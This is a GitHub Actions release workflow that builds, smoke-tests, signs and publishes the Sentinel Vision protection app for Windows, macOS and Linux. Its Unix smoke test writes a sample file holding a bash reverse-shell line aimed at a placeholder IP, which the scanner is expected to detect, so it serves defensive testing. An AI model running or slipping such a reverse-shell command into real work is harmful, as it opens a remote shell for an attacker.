name: Release

# Builds the Windows installer + portable zip, the macOS app and the Linux bundle, smoke-tests each one on a
# clean machine (the Windows installer is installed, upgraded, relaunched and uninstalled), and — for version
# tags — publishes them with SHA-256 checksums as a GitHub Release.
#
# Optional Windows code signing: add repository secrets WINDOWS_CERT_PFX_BASE64 (base64 of a .pfx code-signing
# certificate) and WINDOWS_CERT_PASSWORD. Without them the builds are produced unsigned.

on:
  push:
    tags: ["v*"]
  workflow_dispatch:
    inputs:
      publish:
        description: "Publish a GitHub Release for the version in __init__.py (creates tag v<version>; main branch only)"
        type: boolean
        default: false

permissions:
  contents: read

jobs:
  version:
    runs-on: ubuntu-latest
    outputs:
      version: ${{ steps.v.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - id: v
        shell: bash
        run: |
          version=$(python3 -c "import re;print(re.search(r'__version__ = \"([^\"]+)\"', open('src/sentinel_vision/__init__.py').read()).group(1))")
          echo "version=$version" >> "$GITHUB_OUTPUT"
          if [[ "$GITHUB_REF" == refs/tags/v* && "${GITHUB_REF#refs/tags/v}" != "$version" ]]; then
            echo "::error::Tag ${GITHUB_REF#refs/tags/} does not match __version__ $version"; exit 1
          fi
          if [[ "${{ github.event_name }}" == "workflow_dispatch" && "${{ inputs.publish }}" == "true" ]]; then
            if [[ "$GITHUB_REF" != "refs/heads/main" ]]; then echo "::error::Publishing is only allowed from main"; exit 1; fi
            if git ls-remote --exit-code --tags origin "refs/tags/v$version" >/dev/null; then
              echo "::error::Tag v$version already exists — bump __version__ first"; exit 1
            fi
          fi
          echo "Building version $version"

  windows:
    needs: version
    runs-on: windows-latest
    env:
      VERSION: ${{ needs.version.outputs.version }}
      WINDOWS_CERT_PFX_BASE64: ${{ secrets.WINDOWS_CERT_PFX_BASE64 }}
      WINDOWS_CERT_PASSWORD: ${{ secrets.WINDOWS_CERT_PASSWORD }}
      INNO_VERSION: "6.7.1"
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: "3.12"
      - name: Install build tools (exact, hash-checked versions)
        shell: pwsh
        run: |
          function Run-Logged([string]$Title, [scriptblock]$Cmd) {
            $log = Join-Path $env:RUNNER_TEMP ("step-" + [guid]::NewGuid() + ".log")
            & $Cmd *>&1 | Tee-Object -FilePath $log | Out-Host
            if ($LASTEXITCODE -ne 0) {
              $tail = (Get-Content $log -Tail 25) -join "%0A"
              Write-Host "::error title=$Title failed::$tail"
              exit 1
            }
          }
          Run-Logged "pip (locked)" { pip install --require-hashes -r requirements/build.lock }
          Run-Logged "pip (project)" { pip install --no-deps --no-build-isolation . }
          # Inno Setup pinned to one version (Chocolatey verifies the download's checksum)
          $avail = (choco search innosetup --exact --all-versions --limit-output | Select-Object -First 8) -join ", "
          Write-Host "::notice title=Inno Setup versions on Chocolatey::$avail"
          Run-Logged "Inno Setup $env:INNO_VERSION" { choco install innosetup --version $env:INNO_VERSION --no-progress -y --allow-downgrade }
          $iscc = Get-ChildItem "${env:ProgramFiles(x86)}\Inno Setup*\ISCC.exe", "$env:ProgramFiles\Inno Setup*\ISCC.exe" -ErrorAction SilentlyContinue | Select-Object -First 1
          if (-not $iscc) { Write-Host "::error title=Inno Setup::ISCC.exe not found"; exit 1 }
          Write-Host "::notice title=Inno Setup::$($iscc.FullName) $((Get-Item $iscc.FullName).VersionInfo.ProductVersion)"
      - name: Third-party notices (fails if a bundled package has no licence)
        run: python tools/third_party_notices.py build/notices/THIRD_PARTY_NOTICES.txt
      - name: Build app (PyInstaller)
        run: |
          pyinstaller --noconfirm packaging/sentinel_vision.spec
          Copy-Item build\notices\THIRD_PARTY_NOTICES.txt dist\SentinelVision\
          Copy-Item LICENSE dist\SentinelVision\LICENSE.txt
      - name: Sign executables (optional)
        if: env.WINDOWS_CERT_PFX_BASE64 != ''
        shell: pwsh
        run: |
          $pfx = Join-Path $env:RUNNER_TEMP "cert.pfx"
          [IO.File]::WriteAllBytes($pfx, [Convert]::FromBase64String($env:WINDOWS_CERT_PFX_BASE64))
          $signtool = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe" | Sort-Object FullName -Descending | Select-Object -First 1
          & $signtool.FullName sign /f $pfx /p $env:WINDOWS_CERT_PASSWORD /fd sha256 /tr http://timestamp.digicert.com /td sha256 dist\SentinelVision\SentinelVision.exe dist\SentinelVision\sentinel-vision-cli.exe dist\SentinelVision\sentinel-vision-service.exe
          if ($LASTEXITCODE -ne 0) { throw "signing failed" }
      - name: Build installer (Inno Setup)
        shell: pwsh
        run: |
          $iscc = (Get-ChildItem "${env:ProgramFiles(x86)}\Inno Setup*\ISCC.exe", "$env:ProgramFiles\Inno Setup*\ISCC.exe" -ErrorAction SilentlyContinue | Select-Object -First 1).FullName
          & $iscc "/DAppVersion=$env:VERSION" packaging\windows\SentinelVision.iss
          if ($LASTEXITCODE -ne 0) { throw "ISCC failed with $LASTEXITCODE" }
      - name: Sign installer (optional)
        if: env.WINDOWS_CERT_PFX_BASE64 != ''
        shell: pwsh
        run: |
          $pfx = Join-Path $env:RUNNER_TEMP "cert.pfx"
          $signtool = Get-ChildItem "C:\Program Files (x86)\Windows Kits\10\bin\*\x64\signtool.exe" | Sort-Object FullName -Descending | Select-Object -First 1
          & $signtool.FullName sign /f $pfx /p $env:WINDOWS_CERT_PASSWORD /fd sha256 /tr http://timestamp.digicert.com /td sha256 "dist\installer\SentinelVision-$env:VERSION-Setup.exe"
          if ($LASTEXITCODE -ne 0) { throw "signing failed" }
          Remove-Item $pfx
      - name: Package
        shell: pwsh
        run: |
          New-Item -ItemType Directory -Force out | Out-Null
          Copy-Item "dist\installer\SentinelVision-$env:VERSION-Setup.exe" out\
          Copy-Item build\notices\THIRD_PARTY_NOTICES.txt out\
          Compress-Archive -Path dist\SentinelVision -DestinationPath "out\SentinelVision-$env:VERSION-windows-portable.zip"
          Get-ChildItem out
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: windows
          path: out/*
          if-no-files-found: error

  windows-installer-test:
    needs: [version, windows]
    runs-on: windows-latest
    timeout-minutes: 60
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          sparse-checkout: packaging/windows
          persist-credentials: false
      # after the checkout, which empties the workspace
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: windows
          path: out
      - name: Upgrade from the previous release, protection service, tamper protection, uninstall
        timeout-minutes: 45
        shell: pwsh
        run: |
          try {
            & packaging/windows/test-installer.ps1 -Setup (Resolve-Path "out\SentinelVision-$env:VERSION-Setup.exe").Path
          } catch {
            $details = "$($_.Exception.Message)`n"
            foreach ($f in @('prev-install.log','install1.log','install2.log','install3.log','install4.log')) {
              if (Test-Path $f) { $details += "--- $f (tail)`n" + ((Get-Content $f -Tail 12) -join "`n") + "`n" }
            }
            $svclog = Join-Path $env:ProgramData 'SentinelVision\Service\service.log'
            if (Test-Path $svclog) { $details += "--- service.log (tail)`n" + ((Get-Content $svclog -Tail 25) -join "`n") + "`n" }
            $log = Join-Path $env:LOCALAPPDATA 'SentinelVision\logs\sentinel.log'
            if (Test-Path $log) { $details += "--- sentinel.log (tail)`n" + ((Get-Content $log -Tail 20) -join "`n") }
            $enc = $details.Replace('%', '%25').Replace("`r", '').Replace("`n", '%0A')
            Write-Host "::error title=Windows installer test::$enc"
            throw
          }
      - name: Where it stopped (if it timed out)
        if: cancelled() || failure()
        shell: pwsh
        run: |
          $details = ''
          if (Test-Path progress.txt) { $details += "--- progress`n" + ((Get-Content progress.txt -Tail 8) -join "`n") + "`n" }
          $svclog = Join-Path $env:ProgramData 'SentinelVision\Service\service.log'
          if (Test-Path $svclog) { $details += "--- service.log (tail)`n" + ((Get-Content $svclog -Tail 15) -join "`n") + "`n" }
          $ev = Join-Path $env:ProgramData 'SentinelVision\Service\events.log'
          if (Test-Path $ev) { $details += "--- events.log (tail)`n" + ((Get-Content $ev -Tail 8) -join "`n") + "`n" }
          $details += "--- sessions`n" + ((query user 2>&1 | Out-String).Trim()) + "`n"
          $applog = Join-Path $env:LOCALAPPDATA 'SentinelVision\logs\sentinel.log'
          if (Test-Path $applog) { $details += "--- sentinel.log (tail)`n" + ((Get-Content $applog -Tail 10) -join "`n") + "`n" }
          $hosts = Get-Item "$env:SystemRoot\System32\drivers\etc\hosts"
          $details += "--- hosts file: $([math]::Round($hosts.Length / 1MB, 1)) MB`n"
          $details += "--- processes: " + ((Get-Process SentinelVision, sentinel-vision-*, unins*, SentinelVision-* -ErrorAction SilentlyContinue | ForEach-Object { "$($_.Name)($($_.Id))" }) -join ', ')
          $enc = $details.Replace('%', '%25').Replace("`r", '').Replace("`n", '%0A')
          Write-Host "::error title=Installer test diagnostics::$enc"
      - name: Upload installer logs
        if: always()
        uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: installer-logs
          path: "*.log"
          if-no-files-found: ignore

  windows-upgrade-test:
    # the path an existing 0.4.x install takes: service already present, replaced while running
    needs: [version, windows]
    runs-on: windows-latest
    timeout-minutes: 40
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
        with:
          sparse-checkout: packaging/windows
          persist-credentials: false
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          name: windows
          path: out
      - name: Upgrade from 0.4.0 with the protection service running
        timeout-minutes: 30
        shell: pwsh
        run: |
          try {
            & packaging/windows/test-upgrade.ps1 -Setup (Resolve-Path "out\SentinelVision-$env:VERSION-Setup.exe").Path -NewVersion $env:VERSION
          } catch {
            $details = "$($_.Exception.Message)`n"
            if (Test-Path progress.txt) { $details += "--- progress`n" + ((Get-Content progress.txt) -join "`n") + "`n" }
            foreach ($f in @('prev-install.log','upgrade.log')) {
              if (Test-Path $f) { $details += "--- $f (tail)`n" + ((Get-Content $f -Tail 12) -join "`n") + "`n" }
            }
            $svclog = Join-Path $env:ProgramData 'SentinelVision\Service\service.log'
            if (Test-Path $svclog) { $details += "--- service.log (tail)`n" + ((Get-Content $svclog -Tail 20) -join "`n") + "`n" }
            $enc = $details.Replace('%', '%25').Replace("`r", '').Replace("`n", '%0A')
            Write-Host "::error title=Windows upgrade test::$enc"
            throw
          }

  unix:
    needs: version
    strategy:
      fail-fast: false
      matrix:
        include:
          - os: macos-latest
            name: macos
          - os: ubuntu-22.04  # oldest supported glibc (2.35) so the bundle runs on Ubuntu 22.04+ / Debian 12+
            name: linux
    runs-on: ${{ matrix.os }}
    env:
      VERSION: ${{ needs.version.outputs.version }}
      QT_QPA_PLATFORM: offscreen
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: "3.12"
      - name: Qt runtime libraries (Linux)
        if: runner.os == 'Linux'
        run: |
          sudo apt-get update
          sudo apt-get install -y libegl1 libxkbcommon0 libgl1 libfontconfig1 libdbus-1-3
      - name: Install build tools (exact, hash-checked versions)
        run: |
          pip install --require-hashes -r requirements/build.lock
          pip install --no-deps --no-build-isolation .
      - name: Third-party notices (fails if a bundled package has no licence)
        run: python tools/third_party_notices.py build/notices/THIRD_PARTY_NOTICES.txt
      - name: Build app (PyInstaller)
        shell: bash
        run: |
          pyinstaller --noconfirm packaging/sentinel_vision.spec
          if [[ "$RUNNER_OS" == "macOS" ]]; then dest="dist/SentinelVision.app/Contents/Resources"; else dest="dist/SentinelVision"; fi
          cp build/notices/THIRD_PARTY_NOTICES.txt "$dest/"
          cp LICENSE "$dest/LICENSE.txt"
      - name: Smoke test
        shell: bash
        run: |
          set -euo pipefail
          if [[ "$RUNNER_OS" == "macOS" ]]; then bin="dist/SentinelVision.app/Contents/MacOS"; else bin="dist/SentinelVision"; fi
          if [[ "$RUNNER_OS" == "macOS" ]]; then res="dist/SentinelVision.app/Contents/Resources"; else res="$bin"; fi
          grep -q "GNU LESSER GENERAL PUBLIC LICENSE" "$res/THIRD_PARTY_NOTICES.txt"
          "$bin/sentinel-vision-cli" --version
          "$bin/sentinel-vision-cli" status
          mkdir -p "$RUNNER_TEMP/samples"
          printf '#!/bin/bash\nbash -i >& /dev/tcp/203.0.113.9/4444 0>&1\n' > "$RUNNER_TEMP/samples/backdoor.sh"
          set +e; "$bin/sentinel-vision-cli" scan "$RUNNER_TEMP/samples" --no-quarantine; code=$?; set -e
          test "$code" -eq 1 || { echo "expected exit code 1, got $code"; exit 1; }
          "$bin/SentinelVision" --minimized & pid=$!
          sleep 20
          kill -0 "$pid" || { echo "GUI exited early"; exit 1; }
          kill "$pid"
      - name: Package
        shell: bash
        run: |
          mkdir -p out
          if [[ "$RUNNER_OS" == "macOS" ]]; then
            ditto -c -k --keepParent dist/SentinelVision.app "out/SentinelVision-$VERSION-macos.zip"
          else
            tar -C dist -czf "out/SentinelVision-$VERSION-linux-x86_64.tar.gz" SentinelVision
          fi
          ls -la out
      - uses: actions/upload-artifact@cf430e030ddbb5b0abf93d22962f4752f3646cd9 # v7.0.2
        with:
          name: ${{ matrix.name }}
          path: out/*
          if-no-files-found: error

  publish:
    needs: [version, windows, windows-installer-test, windows-upgrade-test, unix]
    if: >-
      startsWith(github.ref, 'refs/tags/v') ||
      (github.event_name == 'workflow_dispatch' && inputs.publish && github.ref == 'refs/heads/main')
    runs-on: ubuntu-latest
    # audit finding SV-B03: the signing key is only released to this job after the owner approves the
    # deployment (Settings -> Environments -> release -> Required reviewers; see docs/REPO_SETTINGS.md)
    environment: release
    permissions:
      contents: write
    env:
      VERSION: ${{ needs.version.outputs.version }}
    steps:
      - uses: actions/checkout@3d3c42e5aac5ba805825da76410c181273ba90b1 # v7.0.1
      - uses: actions/download-artifact@9000827ccba6bdab643e8b6fd33ac0654aef8333 # v8.0.2
        with:
          path: artifacts
          merge-multiple: true
      - name: Checksums and release notes
        shell: bash
        run: |
          set -euo pipefail
          cd artifacts
          ls -la
          test -f "SentinelVision-$VERSION-Setup.exe"
          test -f THIRD_PARTY_NOTICES.txt
          sha256sum SentinelVision-* THIRD_PARTY_NOTICES.txt > SHA256SUMS.txt
          cat SHA256SUMS.txt
          cd ..
          awk -v v="$VERSION" '$0 ~ "^## \\[" v "\\]" {f=1; next} /^## \[/ {f=0} f' CHANGELOG.md > notes.md
          {
            echo
            echo "### Downloads"
            echo
            echo "| | |"
            echo "|---|---|"
            echo "| **Windows (recommended)** | \`SentinelVision-$VERSION-Setup.exe\` |"
            echo "| Windows portable | \`SentinelVision-$VERSION-windows-portable.zip\` |"
            echo "| macOS 14+ (Apple Silicon) | \`SentinelVision-$VERSION-macos.zip\` |"
            echo "| Linux x86-64 | \`SentinelVision-$VERSION-linux-x86_64.tar.gz\` |"
            echo
            echo "Verify downloads against \`SHA256SUMS.txt\`. Builds are not code-signed yet, so Windows SmartScreen"
            echo "shows *Windows protected your PC* — click **More info → Run anyway**. See the README for details."
          } >> notes.md
          cat notes.md
      - uses: actions/setup-python@6d4fd22b20465ccc0f7354476588e8df7c9ca0e0 # v7.1.0
        with:
          python-version: "3.12"
      - name: Post-quantum signature (ML-DSA-65 + Ed25519)
        env:
          SV_SIGNING_KEY: ${{ secrets.SV_SIGNING_KEY }}
        shell: bash
        run: |
          set -euo pipefail
          if [[ -z "$SV_SIGNING_KEY" ]]; then
            echo "::warning title=Release not signed::Add the SV_SIGNING_KEY repository secret (docs/CODE_SIGNING.md). Apps will not auto-install an unsigned release."
            exit 0
          fi
          python -m pip install --quiet --require-hashes -r requirements/sign.lock
          python tools/pq_sign.py artifacts/SHA256SUMS.txt
          echo "::notice title=Release signed::SHA256SUMS.txt signed with ML-DSA-65 + Ed25519"
      - uses: softprops/action-gh-release@efb35369e0ad2afab669f228072c1b0d510eae64 # v3.0.3
        with:
          tag_name: v${{ env.VERSION }}
          target_commitish: ${{ github.sha }}
          name: Sentinel Vision ${{ env.VERSION }}
          body_path: notes.md
          files: |
            artifacts/SentinelVision-*
            artifacts/THIRD_PARTY_NOTICES.txt
            artifacts/SHA256SUMS.txt*
